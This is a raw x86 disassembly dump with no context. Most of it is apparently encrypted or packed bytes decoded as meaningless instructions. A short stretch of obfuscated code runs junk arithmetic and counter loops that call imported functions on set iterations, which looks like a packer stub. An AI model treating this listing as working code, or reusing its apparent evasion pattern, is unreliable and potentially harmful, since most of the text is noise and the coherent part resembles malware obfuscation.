  4131b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b8:	jo     0x4131a7
  4131ba:	inc    edx
  4131bb:	mov    al,ds:0x999763fb
  4131c0:	xchg   ebx,eax
  4131c1:	cmc    
  4131c2:	pop    es
  4131c3:	pop    es
  4131c4:	addr16 sbb bl,dl
  4131c7:	aaa    
  4131c8:	out    0x11,eax
  4131ca:	lods   eax,DWORD PTR ds:[esi]
  4131cb:	in     eax,0xc2
  4131cd:	jp     0x413152
  4131cf:	fldenv [edx]
  4131d1:	sub    eax,0xea51c1c5
  4131d6:	inc    ebp
  4131d7:	fisub  WORD PTR [ecx+0x1d]
  4131da:	clc    
  4131db:	test   BYTE PTR [ecx+eax*1+0x753692c4],ch
  4131e2:	push   es
  4131e3:	in     eax,0xb0
  4131e5:	sti    
  4131e6:	bound  eax,QWORD PTR [eax+0x23]
  4131e9:	sub    al,0x3f
  4131eb:	jp     0x413193
  4131ed:	mov    al,0x5d
  4131ef:	outs   dx,BYTE PTR ds:[esi]
  4131f0:	xor    eax,0x661fe21b
  4131f5:	jge    0x413254
  4131f7:	and    edi,edx
  4131f9:	pop    esi
  4131fa:	(bad)  
  4131fb:	out    0x9c,al
  4131fd:	int3   
  4131fe:	fild   QWORD PTR [edi+ebx*8+0x2e962e4a]
  413205:	adc    eax,DWORD PTR [esi-0x23]
  413208:	mov    dh,0x40
  41320a:	inc    esp
  41320b:	out    0x67,eax
  41320d:	pop    ecx
  41320e:	mov    eax,0xcffbfed
  413213:	stc    
  413214:	or     BYTE PTR cs:[ebx-0x31790020],cl
  41321b:	cmp    ch,cl
  41321d:	js     0x413231
  41321f:	xchg   ebp,eax
  413220:	mov    edx,0x63caa057
  413225:	inc    ebx
  413226:	sub    al,0x1e
  413228:	aad    0x14
  41322a:	push   ds
  41322b:	dec    eax
  41322c:	or     al,0xa2
  41322e:	adc    BYTE PTR [ebx+0x56f9ad78],bh
  413234:	(bad)  
  413235:	in     al,dx
  413236:	test   eax,0x207988e5
  41323b:	fistp  WORD PTR [ebx+ebp*2+0x57f10b36]
  413242:	retf   
  413243:	fwait
  413244:	dec    ecx
  413245:	mov    WORD PTR [ecx-0x2e894fcb],ss
  41324b:	outs   dx,BYTE PTR ds:[esi]
  41324c:	jb     0x41321e
  41324e:	mov    cl,0xf1
  413250:	sahf   
  413251:	adc    ah,bh
  413253:	(bad)  
  413254:	mov    ds:0x75dac6d8,al
  413259:	lods   al,BYTE PTR ds:[esi]
  41325a:	add    eax,0xe0227285
  41325f:	and    ecx,DWORD PTR [esi+0x32]
  413262:	shl    BYTE PTR [esi],cl
  413264:	sbb    edx,DWORD PTR [edi]
  413266:	sub    bh,BYTE PTR [esi-0x51]
  413269:	out    0x8a,eax
  41326b:	adc    DWORD PTR [edx],esi
  41326d:	lds    ebp,FWORD PTR [ecx-0x1de5b5bb]
  413273:	xchg   ebp,eax
  413274:	sbb    cl,BYTE PTR [ecx]
  413276:	stc    
  413277:	ins    DWORD PTR es:[edi],dx
  413278:	(bad)  [edx]
  41327a:	inc    ecx
  41327b:	fisubr WORD PTR [eax+0x47581990]
  413281:	jecxz  0x41323a
  413283:	sub    BYTE PTR [edx],cl
  413285:	inc    edi
  413286:	mov    edi,0x561186c2
  41328b:	es cld 
  41328d:	and    BYTE PTR [edx],cl
  41328f:	push   ebx
  413290:	pop    ds
  413291:	mov    edx,0xef596fe7
  413296:	scas   eax,DWORD PTR es:[edi]
  413297:	sbb    BYTE PTR [esi+eiz*8],bh
  41329a:	dec    esp
  41329b:	psadbw mm1,mm2
  41329e:	subps  xmm6,XMMWORD PTR [edx-0xdcbc276]
  4132a5:	test   DWORD PTR [eax+0x2d20319d],edi
  4132ab:	shr    BYTE PTR [edx-0x40],0xa7
  4132af:	jmp    0x413281
  4132b1:	int3   
  4132b2:	pop    esp
  4132b3:	xor    al,0x17
  4132b5:	xor    esi,eax
  4132b7:	cmp    esp,ecx
  4132b9:	jmp    0xf677:0x52ce7ebf
  4132c0:	aad    0xe5
  4132c2:	call   0x8674:0x41ae32dc
  4132c9:	stc    
  4132ca:	ja     0x413322
  4132cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132cd:	push   cs
  4132ce:	dec    esp
  4132cf:	adc    BYTE PTR [esp+ebp*4],bl
  4132d2:	lods   eax,DWORD PTR ss:[esi]
  4132d4:	addr16 nop
  4132d6:	inc    ebp
  4132d7:	inc    ebx
  4132d8:	pusha  
  4132d9:	add    eax,0x7b12d9c0
  4132de:	xor    cl,ah
  4132e0:	push   esp
  4132e1:	cwde   
  4132e2:	ins    BYTE PTR es:[edi],dx
  4132e3:	bound  esp,QWORD PTR [ebx-0x2c]
  4132e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e7:	in     eax,0xcd
  4132e9:	das    
  4132ea:	jmp    0x41330a
  4132ec:	je     0x4132da
  4132ee:	sbb    al,0xc2
  4132f0:	xchg   BYTE PTR [edx],dl
  4132f2:	push   esi
  4132f3:	std    
  4132f4:	out    dx,eax
  4132f5:	adc    ebx,DWORD PTR [edx]
  4132f7:	ror    DWORD PTR [edx-0x6c6e37c],0xc2
  4132fe:	push   edx
  4132ff:	ds jo  0x4132a6
  413302:	adc    ebp,edi
  413304:	cmc    
  413305:	popf   
  413306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413307:	push   es
  413308:	(bad)  
  413309:	adc    eax,0xcb378943
  41330e:	sub    DWORD PTR [ecx+eiz*1],esp
  413311:	xchg   DWORD PTR [ebx+edi*4+0x1d],edi
  413315:	cmp    DWORD PTR [ecx],esi
  413317:	pop    edi
  413318:	push   eax
  413319:	mov    eax,ds:0xf2e0270a
  41331e:	dec    edi
  41331f:	stc    
  413320:	inc    esp
  413321:	xlat   BYTE PTR ds:[ebx]
  413322:	xchg   esi,eax
  413323:	pop    ebx
  413324:	lahf   
  413325:	inc    esp
  413326:	sub    bl,BYTE PTR [edi+0x4fa3c398]
  41332c:	and    al,0x9c
  41332e:	hlt    
  41332f:	jle    0x413348
  413331:	out    0x23,al
  413333:	jo     0x413345
  413335:	retf   0xe784
  413338:	fwait
  413339:	push   edi
  41333a:	sub    ecx,ebx
  41333c:	enter  0xa89,0xc7
  413340:	add    eax,0x420e8e
  413345:	push   ss
  413346:	add    BYTE PTR [eax],al
  413348:	add    BYTE PTR [ebx+0x420e8e3d],al
  41334e:	add    BYTE PTR [eax],al
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	pop    edx
  413706:	sahf   
  413707:	retf   
  413708:	and    eax,0x7a7a73be
  41370d:	or     bl,BYTE PTR [edi+0x7a]
  413710:	jp     0x413763
  413712:	scas   al,BYTE PTR es:[edi]
  413713:	mov    ecx,edi
  413715:	push   es
  413716:	rcr    BYTE PTR [ebx],cl
  413718:	ins    DWORD PTR es:[edi],dx
  413719:	mov    esp,fs
  41371b:	and    dh,BYTE PTR [esi]
  41371d:	imul   edi,esi,0xad167037
  413723:	ds (bad) 
  413726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413727:	pop    esi
  413728:	sbb    dh,BYTE PTR [esi+0x38]
  41372b:	in     al,dx
  41372c:	inc    edi
  41372d:	cdq    
  41372e:	jmp    0x413785
  413730:	pusha  
  413731:	jmp    0xfebd:0x72b7f300
  413738:	and    BYTE PTR [ebx+0x3e0a3ba8],ch
  41373e:	sbb    ecx,ebx
  413740:	rcl    DWORD PTR [ecx],1
  413742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413743:	cs or  eax,0x1172d72c
  413749:	mov    edi,0x8f96386d
  41374e:	test   eax,0xb0e450aa
  413753:	clc    
  413754:	stos   BYTE PTR es:[edi],al
  413755:	aas    
  413756:	add    ebp,DWORD PTR [edi+esi*8+0x47]
  41375a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41375b:	or     DWORD PTR ds:0x8d3276b6,ecx
  413761:	sbb    dl,BYTE PTR [edx-0x33]
  413764:	ds jmp 0x4136fa
  413767:	mov    bh,0x10
  413769:	cmp    DWORD PTR [ebx],ecx
  41376b:	xor    eax,0x64c33e09
  413770:	xor    ch,BYTE PTR [edi-0x4d520e18]
  413776:	stos   BYTE PTR es:[edi],al
  413777:	push   esp
  413778:	mov    esi,0xa9be8ae0
  41377d:	add    esi,DWORD PTR [ebp+0x421f6d5d]
  413783:	xchg   edx,eax
  413784:	and    DWORD PTR [edi-0x7a7872f4],0xdcbd1118
  41378e:	shl    eax,1
  413790:	and    DWORD PTR [eax+0x7],edx
  413793:	xchg   ebp,eax
  413794:	lahf   
  413795:	repnz idiv DWORD PTR [edi-0x44]
  413799:	out    dx,al
  41379a:	xchg   ebx,eax
  41379b:	xchg   edx,eax
  41379c:	pop    esp
  41379d:	add    ebx,DWORD PTR [ecx-0x49]
  4137a0:	cmp    edx,DWORD PTR [ecx+0x5ccbd2c2]
  4137a6:	rol    BYTE PTR [ebp+0x4e],0x4a
  4137aa:	dec    edi
  4137ab:	cmp    DWORD PTR [edx+edi*8+0x27e09838],eax
  4137b2:	ret    
  4137b3:	xor    BYTE PTR [esi],ah
  4137b5:	ds dec ecx
  4137b7:	jo     0x4137be
  4137b9:	jecxz  0x413829
  4137bb:	jb     0x41374f
  4137bd:	push   0xffffff88
  4137bf:	add    dl,ah
  4137c1:	bound  ebx,QWORD PTR [edi]
  4137c3:	loope  0x4137bc
  4137c5:	push   edi
  4137c6:	mov    dl,0x9f
  4137c8:	mov    ecx,0xe379971d
  4137cd:	push   ecx
  4137ce:	out    dx,eax
  4137cf:	adc    al,0xf5
  4137d1:	jg     0x41383f
  4137d3:	scas   al,BYTE PTR es:[edi]
  4137d4:	mov    edx,DWORD PTR [ebp-0x44]
  4137d7:	dec    edx
  4137d8:	sbb    DWORD PTR [edi+0x6c],edi
  4137db:	pop    es
  4137dc:	daa    
  4137dd:	cmp    BYTE PTR [ecx],cl
  4137df:	push   ebx
  4137e0:	mov    eax,0xf5d546f3
  4137e5:	dec    esp
  4137e6:	cs jmp 0x4137a5
  4137e9:	scas   al,BYTE PTR es:[edi]
  4137ea:	fmul   st,st(0)
  4137ec:	inc    esp
  4137ed:	cli    
  4137ee:	push   edx
  4137ef:	add    BYTE PTR [eax],al
  4137f1:	xchg   ebp,eax
  4137f2:	cmp    esp,DWORD PTR [esi-0x25]
  4137f5:	xor    BYTE PTR [eax],ch
  4137f7:	and    BYTE PTR [edx+eiz*8+0x36],bh
  4137fb:	out    0x3a,al
  4137fd:	lock mov BYTE PTR [ecx+edx*2-0x62],dh
  413802:	xor    bl,bl
  413804:	mov    WORD PTR [esi-0x5e0fdacc],ds
  41380a:	jb     0x413803
  41380c:	pushf  
  41380d:	or     dh,al
  41380f:	adc    al,0x76
  413811:	or     al,0x82
  413813:	in     eax,0xf9
  413815:	pop    ebx
  413816:	dec    esi
  413817:	fcom   st(6)
  413819:	inc    esp
  41381a:	and    al,0x13
  41381c:	fs scas eax,DWORD PTR es:[edi]
  41381e:	inc    ecx
  41381f:	lds    ecx,FWORD PTR ds:0x7b2a14ea
  413825:	mov    esp,0x4bd0ac9e
  41382a:	inc    esp
  41382b:	mov    esp,0x5c0a6590
  413830:	aas    
  413831:	rcl    BYTE PTR [eax-0x7f],cl
  413834:	pusha  
  413835:	mov    eax,0x314db233
  41383a:	daa    
  41383b:	cs lahf 
  41383d:	sbb    DWORD PTR [ecx+0x76],ecx
  413840:	adc    BYTE PTR [eax+0x7e],ah
  413843:	scas   eax,DWORD PTR es:[edi]
  413844:	mov    al,ds:0x71b68c00
  413849:	ins    BYTE PTR es:[edi],dx
  41384a:	es push ebx
  41384c:	test   DWORD PTR [edx+ebp*2],ebx
  41384f:	inc    ebp
  413850:	pop    esi
  413851:	ret    0xdfd3
  413854:	fstp   st(1)
  413856:	adc    DWORD PTR [edi],eax
  413858:	add    dl,BYTE PTR [ebx]
  41385a:	call   0x452d:0xadebe4bc
  413861:	dec    edi
  413862:	loop   0x41383d
  413864:	bound  eax,QWORD PTR [ebx+0x7]
  413867:	cmp    ah,BYTE PTR [esi+0x30]
  41386a:	pusha  
  41386b:	mov    eax,0x8c4749e6
  413870:	or     al,0xb2
  413872:	dec    eax
  413873:	jbe    0x41388a
  413875:	(bad)  
  413877:	jnp    0x4138bc
  413879:	outs   dx,DWORD PTR ds:[esi]
  41387a:	jmp    0x4138b0
  41387c:	in     al,dx
  41387d:	(bad)  
  41387e:	cmp    BYTE PTR [eax-0x36d7c2ba],dh
  413884:	adc    esp,DWORD PTR [ebx]
  413886:	push   ss
  413887:	repnz std 
  413889:	retf   
  41388a:	jmp    0xbd4afd52
  41388f:	add    eax,0x97fcf0
  413894:	jno    0x41383d
  413896:	add    BYTE PTR [edi+0x732c70a],0x11
  41389d:	jnp    0x4138d5
  41389f:	jne    0x413900
  4138a1:	mov    al,ds:0xcd32a9c0
  4138a6:	xchg   edx,eax
  4138a7:	xor    al,0xef
  4138a9:	dec    ebp
  4138aa:	adc    BYTE PTR ds:0x7ec25a5d,ch
  4138b0:	inc    ecx
  4138b1:	fldcw  WORD PTR [ebx+0x7261a233]
  4138b7:	in     eax,dx
  4138b8:	sub    ebx,eax
  4138ba:	cli    
  4138bb:	nop
  4138bc:	jmp    0x31ff:0x7c47d966
  4138c3:	out    0x49,eax
  4138c5:	jb     0x41390c
  4138c7:	lock xor edi,eax
  4138ca:	icebp  
  4138cb:	int3   
  4138cc:	ins    BYTE PTR es:[edi],dx
  4138cd:	inc    edi
  4138ce:	int    0x4d
  4138d0:	xlat   BYTE PTR ds:[ebx]
  4138d1:	lahf   
  4138d2:	push   esp
  4138d3:	cmp    eax,0x5ea0279
  4138d8:	fcmovu st,st(7)
  4138da:	pusha  
  4138db:	out    0x4,al
  4138dd:	imul   esi,DWORD PTR [ebx],0xf6040891
  4138e3:	push   edi
  4138e4:	jbe    0x413935
  4138e6:	lods   eax,DWORD PTR ds:[esi]
  4138e7:	add    DWORD PTR [ebx],0xffffffd9
  4138ea:	stos   BYTE PTR es:[edi],al
  4138eb:	mov    esi,0x51ac303c
  4138f0:	pop    es
  4138f1:	jl     0x4138f9
  4138f3:	add    eax,0x3248a534
  4138f8:	add    bl,bh
  4138fa:	jecxz  0x413882
  4138fc:	mov    ch,0xb7
  4138fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138ff:	ds jg  0x41388a
  413902:	aam    0x78
  413904:	push   edi
  413905:	call   0x982ccf07
  41390a:	repnz sub eax,0xd9db56fa
  413910:	aam    0x86
  413912:	popa   
  413913:	inc    ecx
  413914:	xor    eax,0x41a94070
  413919:	cmp    eax,0x4f80583e
  41391e:	sti    
  41391f:	aad    0xaa
  413921:	pop    ebx
  413922:	jns    0x41399a
  413924:	or     bh,ah
  413926:	pop    ebx
  413927:	mov    dl,0xa3
  413929:	mov    ch,0x77
  41392b:	retf   0xda83
  41392e:	push   ds
  41392f:	neg    BYTE PTR [edi-0x46]
  413932:	dec    edx
  413933:	out    dx,al
  413934:	repnz popa 
  413936:	cmc    
  413937:	ss ret 0xf845
  41393b:	dec    esi
  41393c:	stos   BYTE PTR es:[edi],al
  41393d:	cmp    BYTE PTR [esi],0xff
  413940:	mov    esp,0x79ffb322
  413945:	retf   0x2039
  413948:	(bad)  
  413949:	ja     0x4138d2
  41394b:	xor    al,0xc7
  41394d:	push   ebp
  41394e:	adc    bh,ch
  413950:	ja     0x41391a
  413952:	minps  xmm2,xmm1
  413955:	mov    dh,0x5d
  413957:	out    dx,eax
  413958:	cmp    dl,BYTE PTR [ecx+0x6]
  41395b:	push   es
  41395c:	jecxz  0x4138fa
  41395e:	jbe    0x41396a
  413960:	fnstsw WORD PTR [esi]
  413962:	fidivr WORD PTR [esp+edi*2]
  413965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413966:	cwde   
  413967:	inc    esp
  413968:	in     eax,dx
  413969:	or     BYTE PTR ss:[ebx+0x38e27926],ah
  413970:	cmp    DWORD PTR [edx+ecx*8],0xe734f27f
  413977:	out    dx,eax
  413978:	nop
  413979:	inc    edx
  41397a:	fxch   st(1)
  41397c:	test   BYTE PTR [ecx-0x60],0x18
  413980:	aad    0x92
  413982:	std    
  413983:	add    esp,DWORD PTR ds:[esi-0x3674e0e5]
  41398a:	imul   edx,DWORD PTR [eax],0x3b
  41398d:	sbb    al,0xfc
  41398f:	xor    DWORD PTR [edi+esi*2-0x31da4cef],esi
  413996:	repnz cld 
  413998:	icebp  
  413999:	in     al,dx
  41399a:	std    
  41399b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41399c:	(bad)  
  41399e:	pop    edx
  41399f:	fnstcw WORD PTR [edx-0x75]
  4139a2:	rol    DWORD PTR ds:0x5649af20,0xc7
  4139a9:	js     0x4139e3
  4139ab:	aaa    
  4139ac:	dec    eax
  4139ad:	dec    ecx
  4139ae:	push   esi
  4139af:	popf   
  4139b0:	fdiv   st(3),st
  4139b2:	mov    esi,DWORD PTR [edx]
  4139b4:	mov    bh,0x31
  4139b6:	mov    bl,0x86
  4139b8:	sar    BYTE PTR [edi+0xf4b6a77],0xf1
  4139bf:	jle    0x4139ce
  4139c1:	pop    ebp
  4139c3:	les    ebx,FWORD PTR [esi]
  4139c5:	les    eax,FWORD PTR [esi+0x115901a4]
  4139cb:	sub    eax,0x3e59435a
  4139d0:	adc    ah,BYTE PTR [ebp+edx*2-0x4c802d5e]
  4139d7:	jecxz  0x413a03
  4139d9:	push   ecx
  4139da:	mov    ch,0xdb
  4139dc:	sahf   
  4139dd:	cmp    BYTE PTR [ecx-0x2e],bl
  4139e0:	and    ch,ah
  4139e2:	or     DWORD PTR ds:0x58518017,edi
  4139e8:	into   
  4139e9:	call   0x309f926
  4139ee:	xchg   ecx,eax
  4139ef:	(bad)  
  4139f0:	in     al,0x7d
  4139f2:	das    
  4139f3:	mov    dh,0x46
  4139f5:	add    dh,BYTE PTR [esp+ebx*8+0x716965e3]
  4139fc:	inc    edi
  4139fd:	or     eax,0xe5ae905c
  413a02:	loopne 0x413a55
  413a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a05:	rol    DWORD PTR [eax-0x4a],0xdd
  413a09:	fstp   DWORD PTR gs:[ebx]
  413a0c:	adc    ah,BYTE PTR [edx-0x44]
  413a0f:	xchg   ebx,eax
  413a10:	stc    
  413a11:	or     eax,0x8af8f3d7
  413a16:	jae    0x413a7d
  413a18:	retf   
  413a19:	arpl   WORD PTR [edi],cx
  413a1b:	enter  0xd685,0xfe
  413a1f:	xchg   edi,eax
  413a20:	jmp    0xe2be7c84
  413a25:	adc    DWORD PTR [eax],edi
  413a27:	ret    
  413a28:	(bad)  
  413a29:	stc    
  413a2a:	and    al,0x7a
  413a2c:	and    eax,0x6811494c
  413a31:	daa    
  413a32:	jo     0x413a69
  413a34:	adc    dh,cl
  413a36:	ret    0xb5b8
  413a39:	xor    BYTE PTR [eax+0x240721dd],ch
  413a3f:	jp     0x4139f4
  413a41:	mov    al,ds:0xc1ec4ddc
  413a46:	jmp    0x413a59
  413a48:	fwait
  413a49:	imul   BYTE PTR [ebp+0x22aeab3d]
  413a4f:	inc    eax
  413a50:	push   esp
  413a51:	shl    bh,1
  413a53:	call   0x80fd:0x8051656
  413a5a:	sub    ah,BYTE PTR [eax+0x14ff516a]
  413a60:	retf   
  413a61:	fidivr DWORD PTR [ebx+0x6]
  413a64:	lahf   
  413a65:	and    dh,bl
  413a67:	inc    edi
  413a68:	push   esp
  413a69:	inc    eax
  413a6a:	scas   eax,DWORD PTR es:[edi]
  413a6b:	dec    ebp
  413a6c:	repnz imul ecx,DWORD PTR [edx-0x6f],0xfffffff5
  413a71:	push   edx
  413a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a73:	mov    ch,0xd7
  413a75:	jnp    0x413a9f
  413a77:	jmp    0xa160:0x76527d58
  413a7e:	or     DWORD PTR [edx-0x2a],esp
  413a81:	adc    BYTE PTR [eax+eax*4+0x68111700],ch
  413a88:	rcl    DWORD PTR [edi],cl
  413a8a:	pop    es
  413a8b:	test   al,0xcc
  413a8d:	cmp    DWORD PTR [eax-0x77],esi
  413a90:	mov    ebx,DWORD PTR [esi]
  413a92:	mov    edx,0x8c319226
  413a97:	fmul   st(2),st
  413a99:	and    dl,ch
  413a9b:	or     eax,0xffbbb70
  413aa0:	mov    ds:0x1f9d453b,al
  413aa5:	push   0x537c6700
